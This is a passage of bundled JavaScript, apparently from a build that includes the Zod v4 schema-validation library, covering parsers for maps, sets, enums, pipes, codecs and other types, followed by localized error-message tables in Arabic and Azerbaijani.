                payload.issues.push(...prefixIssues2(key, result2.issues));
              }
              payload.value[key] = result2.value;
            }));
          } else {
            if (result.issues.length) {
              payload.issues.push(...prefixIssues2(key, result.issues));
            }
            payload.value[key] = result.value;
          }
        }
      }
      let unrecognized;
      for (const key in input) {
        if (!values.has(key)) {
          unrecognized = unrecognized ?? [];
          unrecognized.push(key);
        }
      }
      if (unrecognized && unrecognized.length > 0) {
        payload.issues.push({
          code: "unrecognized_keys",
          input,
          inst,
          keys: unrecognized
        });
      }
    } else {
      payload.value = {};
      for (const key of Reflect.ownKeys(input)) {
        if (key === "__proto__")
          continue;
        const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
        if (keyResult instanceof Promise) {
          throw new Error("Async schemas not supported in object keys currently");
        }
        if (keyResult.issues.length) {
          payload.issues.push({
            code: "invalid_key",
            origin: "record",
            issues: keyResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2())),
            input: key,
            path: [key],
            inst
          });
          payload.value[keyResult.value] = keyResult.value;
          continue;
        }
        const result = def.valueType._zod.run({ value: input[key], issues: [] }, ctx);
        if (result instanceof Promise) {
          proms.push(result.then((result2) => {
            if (result2.issues.length) {
              payload.issues.push(...prefixIssues2(key, result2.issues));
            }
            payload.value[keyResult.value] = result2.value;
          }));
        } else {
          if (result.issues.length) {
            payload.issues.push(...prefixIssues2(key, result.issues));
          }
          payload.value[keyResult.value] = result.value;
        }
      }
    }
    if (proms.length) {
      return Promise.all(proms).then(() => payload);
    }
    return payload;
  };
});
var $ZodMap2 = /* @__PURE__ */ $constructor2("$ZodMap", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Map)) {
      payload.issues.push({
        expected: "map",
        code: "invalid_type",
        input,
        inst
      });
      return payload;
    }
    const proms = [];
    payload.value = new Map;
    for (const [key, value] of input) {
      const keyResult = def.keyType._zod.run({ value: key, issues: [] }, ctx);
      const valueResult = def.valueType._zod.run({ value, issues: [] }, ctx);
      if (keyResult instanceof Promise || valueResult instanceof Promise) {
        proms.push(Promise.all([keyResult, valueResult]).then(([keyResult2, valueResult2]) => {
          handleMapResult2(keyResult2, valueResult2, payload, key, input, inst, ctx);
        }));
      } else {
        handleMapResult2(keyResult, valueResult, payload, key, input, inst, ctx);
      }
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleMapResult2(keyResult, valueResult, final, key, input, inst, ctx) {
  if (keyResult.issues.length) {
    if (propertyKeyTypes2.has(typeof key)) {
      final.issues.push(...prefixIssues2(key, keyResult.issues));
    } else {
      final.issues.push({
        code: "invalid_key",
        origin: "map",
        input,
        inst,
        issues: keyResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
      });
    }
  }
  if (valueResult.issues.length) {
    if (propertyKeyTypes2.has(typeof key)) {
      final.issues.push(...prefixIssues2(key, valueResult.issues));
    } else {
      final.issues.push({
        origin: "map",
        code: "invalid_element",
        input,
        inst,
        key,
        issues: valueResult.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
      });
    }
  }
  final.value.set(keyResult.value, valueResult.value);
}
var $ZodSet2 = /* @__PURE__ */ $constructor2("$ZodSet", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    const input = payload.value;
    if (!(input instanceof Set)) {
      payload.issues.push({
        input,
        inst,
        expected: "set",
        code: "invalid_type"
      });
      return payload;
    }
    const proms = [];
    payload.value = new Set;
    for (const item of input) {
      const result = def.valueType._zod.run({ value: item, issues: [] }, ctx);
      if (result instanceof Promise) {
        proms.push(result.then((result2) => handleSetResult2(result2, payload)));
      } else
        handleSetResult2(result, payload);
    }
    if (proms.length)
      return Promise.all(proms).then(() => payload);
    return payload;
  };
});
function handleSetResult2(result, final) {
  if (result.issues.length) {
    final.issues.push(...result.issues);
  }
  final.value.add(result.value);
}
var $ZodEnum2 = /* @__PURE__ */ $constructor2("$ZodEnum", (inst, def) => {
  $ZodType2.init(inst, def);
  const values = getEnumValues2(def.entries);
  const valuesSet = new Set(values);
  inst._zod.values = valuesSet;
  inst._zod.pattern = new RegExp(`^(${values.filter((k) => propertyKeyTypes2.has(typeof k)).map((o) => typeof o === "string" ? escapeRegex2(o) : o.toString()).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (valuesSet.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodLiteral2 = /* @__PURE__ */ $constructor2("$ZodLiteral", (inst, def) => {
  $ZodType2.init(inst, def);
  if (def.values.length === 0) {
    throw new Error("Cannot create literal schema with no valid values");
  }
  inst._zod.values = new Set(def.values);
  inst._zod.pattern = new RegExp(`^(${def.values.map((o) => typeof o === "string" ? escapeRegex2(o) : o ? escapeRegex2(o.toString()) : String(o)).join("|")})$`);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (inst._zod.values.has(input)) {
      return payload;
    }
    payload.issues.push({
      code: "invalid_value",
      values: def.values,
      input,
      inst
    });
    return payload;
  };
});
var $ZodFile2 = /* @__PURE__ */ $constructor2("$ZodFile", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    const input = payload.value;
    if (input instanceof File)
      return payload;
    payload.issues.push({
      expected: "file",
      code: "invalid_type",
      input,
      inst
    });
    return payload;
  };
});
var $ZodTransform2 = /* @__PURE__ */ $constructor2("$ZodTransform", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError2(inst.constructor.name);
    }
    const _out = def.transform(payload.value, payload);
    if (ctx.async) {
      const output = _out instanceof Promise ? _out : Promise.resolve(_out);
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    if (_out instanceof Promise) {
      throw new $ZodAsyncError2;
    }
    payload.value = _out;
    return payload;
  };
});
function handleOptionalResult2(result, input) {
  if (result.issues.length && input === undefined) {
    return { issues: [], value: undefined };
  }
  return result;
}
var $ZodOptional2 = /* @__PURE__ */ $constructor2("$ZodOptional", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  inst._zod.optout = "optional";
  defineLazy2(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, undefined]) : undefined;
  });
  defineLazy2(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex2(pattern.source)})?$`) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (def.innerType._zod.optin === "optional") {
      const result = def.innerType._zod.run(payload, ctx);
      if (result instanceof Promise)
        return result.then((r) => handleOptionalResult2(r, payload.value));
      return handleOptionalResult2(result, payload.value);
    }
    if (payload.value === undefined) {
      return payload;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNullable2 = /* @__PURE__ */ $constructor2("$ZodNullable", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy2(inst._zod, "pattern", () => {
    const pattern = def.innerType._zod.pattern;
    return pattern ? new RegExp(`^(${cleanRegex2(pattern.source)}|null)$`) : undefined;
  });
  defineLazy2(inst._zod, "values", () => {
    return def.innerType._zod.values ? new Set([...def.innerType._zod.values, null]) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    if (payload.value === null)
      return payload;
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodDefault2 = /* @__PURE__ */ $constructor2("$ZodDefault", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
      return payload;
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleDefaultResult2(result2, def));
    }
    return handleDefaultResult2(result, def);
  };
});
function handleDefaultResult2(payload, def) {
  if (payload.value === undefined) {
    payload.value = def.defaultValue;
  }
  return payload;
}
var $ZodPrefault2 = /* @__PURE__ */ $constructor2("$ZodPrefault", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.optin = "optional";
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    if (payload.value === undefined) {
      payload.value = def.defaultValue;
    }
    return def.innerType._zod.run(payload, ctx);
  };
});
var $ZodNonOptional2 = /* @__PURE__ */ $constructor2("$ZodNonOptional", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => {
    const v = def.innerType._zod.values;
    return v ? new Set([...v].filter((x) => x !== undefined)) : undefined;
  });
  inst._zod.parse = (payload, ctx) => {
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => handleNonOptionalResult2(result2, inst));
    }
    return handleNonOptionalResult2(result, inst);
  };
});
function handleNonOptionalResult2(payload, inst) {
  if (!payload.issues.length && payload.value === undefined) {
    payload.issues.push({
      code: "invalid_type",
      expected: "nonoptional",
      input: payload.value,
      inst
    });
  }
  return payload;
}
var $ZodSuccess2 = /* @__PURE__ */ $constructor2("$ZodSuccess", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      throw new $ZodEncodeError2("ZodSuccess");
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.issues.length === 0;
        return payload;
      });
    }
    payload.value = result.issues.length === 0;
    return payload;
  };
});
var $ZodCatch2 = /* @__PURE__ */ $constructor2("$ZodCatch", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then((result2) => {
        payload.value = result2.value;
        if (result2.issues.length) {
          payload.value = def.catchValue({
            ...payload,
            error: {
              issues: result2.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
            },
            input: payload.value
          });
          payload.issues = [];
        }
        return payload;
      });
    }
    payload.value = result.value;
    if (result.issues.length) {
      payload.value = def.catchValue({
        ...payload,
        error: {
          issues: result.issues.map((iss) => finalizeIssue2(iss, ctx, config2()))
        },
        input: payload.value
      });
      payload.issues = [];
    }
    return payload;
  };
});
var $ZodNaN2 = /* @__PURE__ */ $constructor2("$ZodNaN", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "number" || !Number.isNaN(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "nan",
        code: "invalid_type"
      });
      return payload;
    }
    return payload;
  };
});
var $ZodPipe2 = /* @__PURE__ */ $constructor2("$ZodPipe", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => def.in._zod.values);
  defineLazy2(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy2(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handlePipeResult2(right2, def.in, ctx));
      }
      return handlePipeResult2(right, def.in, ctx);
    }
    const left = def.in._zod.run(payload, ctx);
    if (left instanceof Promise) {
      return left.then((left2) => handlePipeResult2(left2, def.out, ctx));
    }
    return handlePipeResult2(left, def.out, ctx);
  };
});
function handlePipeResult2(left, next, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return next._zod.run({ value: left.value, issues: left.issues }, ctx);
}
var $ZodCodec2 = /* @__PURE__ */ $constructor2("$ZodCodec", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "values", () => def.in._zod.values);
  defineLazy2(inst._zod, "optin", () => def.in._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.out._zod.optout);
  defineLazy2(inst._zod, "propValues", () => def.in._zod.propValues);
  inst._zod.parse = (payload, ctx) => {
    const direction = ctx.direction || "forward";
    if (direction === "forward") {
      const left = def.in._zod.run(payload, ctx);
      if (left instanceof Promise) {
        return left.then((left2) => handleCodecAResult2(left2, def, ctx));
      }
      return handleCodecAResult2(left, def, ctx);
    } else {
      const right = def.out._zod.run(payload, ctx);
      if (right instanceof Promise) {
        return right.then((right2) => handleCodecAResult2(right2, def, ctx));
      }
      return handleCodecAResult2(right, def, ctx);
    }
  };
});
function handleCodecAResult2(result, def, ctx) {
  if (result.issues.length) {
    result.aborted = true;
    return result;
  }
  const direction = ctx.direction || "forward";
  if (direction === "forward") {
    const transformed = def.transform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult2(result, value, def.out, ctx));
    }
    return handleCodecTxResult2(result, transformed, def.out, ctx);
  } else {
    const transformed = def.reverseTransform(result.value, result);
    if (transformed instanceof Promise) {
      return transformed.then((value) => handleCodecTxResult2(result, value, def.in, ctx));
    }
    return handleCodecTxResult2(result, transformed, def.in, ctx);
  }
}
function handleCodecTxResult2(left, value, nextSchema, ctx) {
  if (left.issues.length) {
    left.aborted = true;
    return left;
  }
  return nextSchema._zod.run({ value, issues: left.issues }, ctx);
}
var $ZodReadonly2 = /* @__PURE__ */ $constructor2("$ZodReadonly", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "propValues", () => def.innerType._zod.propValues);
  defineLazy2(inst._zod, "values", () => def.innerType._zod.values);
  defineLazy2(inst._zod, "optin", () => def.innerType._zod.optin);
  defineLazy2(inst._zod, "optout", () => def.innerType._zod.optout);
  inst._zod.parse = (payload, ctx) => {
    if (ctx.direction === "backward") {
      return def.innerType._zod.run(payload, ctx);
    }
    const result = def.innerType._zod.run(payload, ctx);
    if (result instanceof Promise) {
      return result.then(handleReadonlyResult2);
    }
    return handleReadonlyResult2(result);
  };
});
function handleReadonlyResult2(payload) {
  payload.value = Object.freeze(payload.value);
  return payload;
}
var $ZodTemplateLiteral2 = /* @__PURE__ */ $constructor2("$ZodTemplateLiteral", (inst, def) => {
  $ZodType2.init(inst, def);
  const regexParts = [];
  for (const part of def.parts) {
    if (typeof part === "object" && part !== null) {
      if (!part._zod.pattern) {
        throw new Error(`Invalid template literal part, no pattern found: ${[...part._zod.traits].shift()}`);
      }
      const source = part._zod.pattern instanceof RegExp ? part._zod.pattern.source : part._zod.pattern;
      if (!source)
        throw new Error(`Invalid template literal part: ${part._zod.traits}`);
      const start = source.startsWith("^") ? 1 : 0;
      const end = source.endsWith("$") ? source.length - 1 : source.length;
      regexParts.push(source.slice(start, end));
    } else if (part === null || primitiveTypes2.has(typeof part)) {
      regexParts.push(escapeRegex2(`${part}`));
    } else {
      throw new Error(`Invalid template literal part: ${part}`);
    }
  }
  inst._zod.pattern = new RegExp(`^${regexParts.join("")}$`);
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "string") {
      payload.issues.push({
        input: payload.value,
        inst,
        expected: "template_literal",
        code: "invalid_type"
      });
      return payload;
    }
    inst._zod.pattern.lastIndex = 0;
    if (!inst._zod.pattern.test(payload.value)) {
      payload.issues.push({
        input: payload.value,
        inst,
        code: "invalid_format",
        format: def.format ?? "template_literal",
        pattern: inst._zod.pattern.source
      });
      return payload;
    }
    return payload;
  };
});
var $ZodFunction2 = /* @__PURE__ */ $constructor2("$ZodFunction", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._def = def;
  inst._zod.def = def;
  inst.implement = (func) => {
    if (typeof func !== "function") {
      throw new Error("implement() must be called with a function");
    }
    return function(...args) {
      const parsedArgs = inst._def.input ? parse5(inst._def.input, args) : args;
      const result = Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return parse5(inst._def.output, result);
      }
      return result;
    };
  };
  inst.implementAsync = (func) => {
    if (typeof func !== "function") {
      throw new Error("implementAsync() must be called with a function");
    }
    return async function(...args) {
      const parsedArgs = inst._def.input ? await parseAsync3(inst._def.input, args) : args;
      const result = await Reflect.apply(func, this, parsedArgs);
      if (inst._def.output) {
        return await parseAsync3(inst._def.output, result);
      }
      return result;
    };
  };
  inst._zod.parse = (payload, _ctx) => {
    if (typeof payload.value !== "function") {
      payload.issues.push({
        code: "invalid_type",
        expected: "function",
        input: payload.value,
        inst
      });
      return payload;
    }
    const hasPromiseOutput = inst._def.output && inst._def.output._zod.def.type === "promise";
    if (hasPromiseOutput) {
      payload.value = inst.implementAsync(payload.value);
    } else {
      payload.value = inst.implement(payload.value);
    }
    return payload;
  };
  inst.input = (...args) => {
    const F = inst.constructor;
    if (Array.isArray(args[0])) {
      return new F({
        type: "function",
        input: new $ZodTuple2({
          type: "tuple",
          items: args[0],
          rest: args[1]
        }),
        output: inst._def.output
      });
    }
    return new F({
      type: "function",
      input: args[0],
      output: inst._def.output
    });
  };
  inst.output = (output) => {
    const F = inst.constructor;
    return new F({
      type: "function",
      input: inst._def.input,
      output
    });
  };
  return inst;
});
var $ZodPromise2 = /* @__PURE__ */ $constructor2("$ZodPromise", (inst, def) => {
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, ctx) => {
    return Promise.resolve(payload.value).then((inner) => def.innerType._zod.run({ value: inner, issues: [] }, ctx));
  };
});
var $ZodLazy2 = /* @__PURE__ */ $constructor2("$ZodLazy", (inst, def) => {
  $ZodType2.init(inst, def);
  defineLazy2(inst._zod, "innerType", () => def.getter());
  defineLazy2(inst._zod, "pattern", () => inst._zod.innerType._zod.pattern);
  defineLazy2(inst._zod, "propValues", () => inst._zod.innerType._zod.propValues);
  defineLazy2(inst._zod, "optin", () => inst._zod.innerType._zod.optin ?? undefined);
  defineLazy2(inst._zod, "optout", () => inst._zod.innerType._zod.optout ?? undefined);
  inst._zod.parse = (payload, ctx) => {
    const inner = inst._zod.innerType;
    return inner._zod.run(payload, ctx);
  };
});
var $ZodCustom2 = /* @__PURE__ */ $constructor2("$ZodCustom", (inst, def) => {
  $ZodCheck2.init(inst, def);
  $ZodType2.init(inst, def);
  inst._zod.parse = (payload, _) => {
    return payload;
  };
  inst._zod.check = (payload) => {
    const input = payload.value;
    const r = def.fn(input);
    if (r instanceof Promise) {
      return r.then((r2) => handleRefineResult2(r2, payload, input, inst));
    }
    handleRefineResult2(r, payload, input, inst);
    return;
  };
});
function handleRefineResult2(result, payload, input, inst) {
  if (!result) {
    const _iss = {
      code: "custom",
      input,
      inst,
      path: [...inst._zod.def.path ?? []],
      continue: !inst._zod.def.abort
    };
    if (inst._zod.def.params)
      _iss.params = inst._zod.def.params;
    payload.issues.push(issue2(_iss));
  }
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/index.js
var exports_locales2 = {};
__export(exports_locales2, {
  zhTW: () => zh_TW_default2,
  zhCN: () => zh_CN_default2,
  yo: () => yo_default2,
  vi: () => vi_default2,
  ur: () => ur_default2,
  uk: () => uk_default2,
  ua: () => ua_default2,
  tr: () => tr_default2,
  th: () => th_default2,
  ta: () => ta_default2,
  sv: () => sv_default2,
  sl: () => sl_default2,
  ru: () => ru_default2,
  pt: () => pt_default2,
  ps: () => ps_default2,
  pl: () => pl_default2,
  ota: () => ota_default2,
  no: () => no_default2,
  nl: () => nl_default2,
  ms: () => ms_default2,
  mk: () => mk_default2,
  lt: () => lt_default2,
  ko: () => ko_default2,
  km: () => km_default2,
  kh: () => kh_default2,
  ka: () => ka_default2,
  ja: () => ja_default2,
  it: () => it_default2,
  is: () => is_default2,
  id: () => id_default2,
  hu: () => hu_default2,
  he: () => he_default2,
  frCA: () => fr_CA_default2,
  fr: () => fr_default2,
  fi: () => fi_default2,
  fa: () => fa_default2,
  es: () => es_default2,
  eo: () => eo_default2,
  en: () => en_default2,
  de: () => de_default2,
  da: () => da_default2,
  cs: () => cs_default2,
  ca: () => ca_default2,
  be: () => be_default2,
  az: () => az_default2,
  ar: () => ar_default2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ar.js
var error48 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0641", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    file: { unit: "\u0628\u0627\u064A\u062A", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    array: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" },
    set: { unit: "\u0639\u0646\u0635\u0631", verb: "\u0623\u0646 \u064A\u062D\u0648\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0645\u062F\u062E\u0644",
    email: "\u0628\u0631\u064A\u062F \u0625\u0644\u0643\u062A\u0631\u0648\u0646\u064A",
    url: "\u0631\u0627\u0628\u0637",
    emoji: "\u0625\u064A\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u064A\u062E \u0648\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    date: "\u062A\u0627\u0631\u064A\u062E \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    time: "\u0648\u0642\u062A \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    duration: "\u0645\u062F\u0629 \u0628\u0645\u0639\u064A\u0627\u0631 ISO",
    ipv4: "\u0639\u0646\u0648\u0627\u0646 IPv4",
    ipv6: "\u0639\u0646\u0648\u0627\u0646 IPv6",
    cidrv4: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv4",
    cidrv6: "\u0645\u062F\u0649 \u0639\u0646\u0627\u0648\u064A\u0646 \u0628\u0635\u064A\u063A\u0629 IPv6",
    base64: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64-encoded",
    base64url: "\u0646\u064E\u0635 \u0628\u062A\u0631\u0645\u064A\u0632 base64url-encoded",
    json_string: "\u0646\u064E\u0635 \u0639\u0644\u0649 \u0647\u064A\u0626\u0629 JSON",
    e164: "\u0631\u0642\u0645 \u0647\u0627\u062A\u0641 \u0628\u0645\u0639\u064A\u0627\u0631 E.164",
    jwt: "JWT",
    template_literal: "\u0645\u062F\u062E\u0644"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${issue3.expected}\u060C \u0648\u0644\u0643\u0646 \u062A\u0645 \u0625\u062F\u062E\u0627\u0644 ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0645\u062F\u062E\u0644\u0627\u062A \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644\u0629: \u064A\u0641\u062A\u0631\u0636 \u0625\u062F\u062E\u0627\u0644 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0627\u062E\u062A\u064A\u0627\u0631 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062A\u0648\u0642\u0639 \u0627\u0646\u062A\u0642\u0627\u0621 \u0623\u062D\u062F \u0647\u0630\u0647 \u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return ` \u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue3.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"}`;
        return `\u0623\u0643\u0628\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0623\u0646 \u062A\u0643\u0648\u0646 ${issue3.origin ?? "\u0627\u0644\u0642\u064A\u0645\u0629"} ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue3.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0623\u0635\u063A\u0631 \u0645\u0646 \u0627\u0644\u0644\u0627\u0632\u0645: \u064A\u0641\u062A\u0631\u0636 \u0644\u0640 ${issue3.origin} \u0623\u0646 \u064A\u0643\u0648\u0646 ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0628\u0640 "${issue3.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0646\u062A\u0647\u064A \u0628\u0640 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u062A\u0636\u0645\u0651\u064E\u0646 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0637\u0627\u0628\u0642 \u0627\u0644\u0646\u0645\u0637 ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644`;
      }
      case "not_multiple_of":
        return `\u0631\u0642\u0645 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0643\u0648\u0646 \u0645\u0646 \u0645\u0636\u0627\u0639\u0641\u0627\u062A ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u0645\u0639\u0631\u0641${issue3.keys.length > 1 ? "\u0627\u062A" : ""} \u063A\u0631\u064A\u0628${issue3.keys.length > 1 ? "\u0629" : ""}: ${joinValues2(issue3.keys, "\u060C ")}`;
      case "invalid_key":
        return `\u0645\u0639\u0631\u0641 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue3.origin}`;
      case "invalid_union":
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
      case "invalid_element":
        return `\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue3.origin}`;
      default:
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
    }
  };
};
function ar_default2() {
  return {
    localeError: error48()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/az.js
var error49 = () => {
  const Sizable = {
    string: { unit: "simvol", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "element", verb: "olmal\u0131d\u0131r" },
    set: { unit: "element", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
